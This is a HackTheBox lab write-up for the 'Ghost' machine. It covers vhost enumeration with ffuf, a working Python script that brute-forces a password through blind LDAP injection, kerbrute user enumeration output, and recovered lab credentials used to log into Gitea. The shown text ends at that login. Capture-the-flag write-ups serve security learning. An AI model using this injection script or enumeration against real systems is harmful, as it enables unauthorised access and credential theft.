---
title: "Ghost - HackTheBox"
description: "Injection LDAP pour récupérer des credentials Gitea, empoisonnement DNS, attaque Golden SAML, abus GMSA et MSSQL linked server cross-domain."
date: 2026-04-28
tags: ["active-directory", "ldap-injection", "golden-saml", "gmsa", "windows", "insane"]
draft: false
---

![alt text](./images/{09172488-952A-4290-9C27-A115CD281237}.png)
# Username
| Users                | Password         | Information                             |
| -------------------- | ---------------- | --------------------------------------- |
| gitea_temp_principal | szrr8kpc3z6onlqf | recover in LDAP injection python script |
| justin.bradley       | Qwertyuiop1234$$ | Retrieve after DNS poisoning            |
# Recon
## Web enumeration - 80
Vhost & directory enum -> Nothing
## Web enumeration - 443
TCP handshake OK but TLS send Client hello packet, the remote host send RST packet and the connection ending
## Web enumeration - 8008
We have a robots.txt
http://10.129.231.105:8008/robots.txt
```makefile
User-agent: *
Sitemap: http://ghost.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
Disallow: /webmentions/receive/
```
-> Vhosts enumeration
```bash
ffuf -u http://ghost.htb:8008/ -H "Host: FUZZ.ghost.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
-> intranet.ghost.htb
```
-> Seems to use LDAP auth to connect to intranet
## Web enumeration - 8443
-> Redirect us to https://federation.ghost.htb
![](./images/Pasted image 20260123133124.png)
# Shell as root in backend Container
## Intranet LDAP injection
-> Exploiting simple LDAP injection payload to get connected as Kathryn.Holland
![](./images/Pasted image 20260123133554.png)
-> We can make a python to find user's password using ldap * and response status code:
```python
import requests
import string
import sys


headers = {"Next-Action": "c471eb076ccac91d6f828b671795550fd5925940"}
username = sys.argv[1] if len(sys.argv) > 1 else "gitea_temp_principal"
password = ""
while True:
    for c in string.printable[:-5]:
        print(f"\rPassword for {username}: {password}{c}", end="")
        files = {
            "1_ldap-username": (None, username),
            "1_ldap-secret": (None, f"{password}{c}*"),
            "0": (None, '[{},"$K1"]'),
        }

        resp = requests.post(
            'http://intranet.ghost.htb:8008/login',
            headers=headers,
            files=files,
        )
        if resp.status_code == 303:
            password += c
            break
    else:
        print()
        break
```
Result:
![](./images/Pasted image 20260123135257.png)
```
szrr8kpc3z6onlqf
```
## Enum valid username using kerbrute
```bash
kerbrute userenum -d ghost.htb users.txt --dc dc01.ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       beth.clark@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       florence.ramirez@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       kathryn.holland@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       robert.steeves@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       justin.bradley@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       intranet_principal@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       charles.gray@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       cassandra.shelton@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       arthur.boyd@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       jason.taylor@ghost.htb
2026/01/23 13:41:14 >  [+] VALID USERNAME:       gitea_temp_principal@ghost.htb
```
## Gitea Subdomain
In the Git Migration field, users said that there are currently migrating Gitea -> Bitbucket
Lets try accessing [gitea.ghost.htb](http://gitea.ghost.htb:8008/): that's work

We can use gitea_temp_principal creds found in using LDAP injection to connect to the gitea instance:
szrr8kpc3z6onlqf
![](./images/Pasted image 20260123143135.png)
Qwertyuiop1234$$